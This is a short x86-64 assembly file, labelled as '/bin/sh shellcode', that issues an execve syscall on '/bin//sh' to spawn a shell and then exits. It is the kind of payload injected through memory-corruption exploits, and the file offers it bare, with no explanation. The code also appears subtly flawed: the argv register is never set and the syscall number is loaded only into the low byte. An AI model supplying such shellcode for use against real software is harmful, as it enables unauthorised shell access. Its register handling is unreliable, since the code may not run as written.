global _start

; "/bin/sh shellcode" 

section .text
_start:
    mov al, 59         
    xor rdx, rdx 
    push rdx              
    mov rdi, '/bin//sh' 
    push rdi            
    mov rdi, rsp        
    push rdx                           
    syscall 

    mov al, 60
    mov dil, 60
    syscall

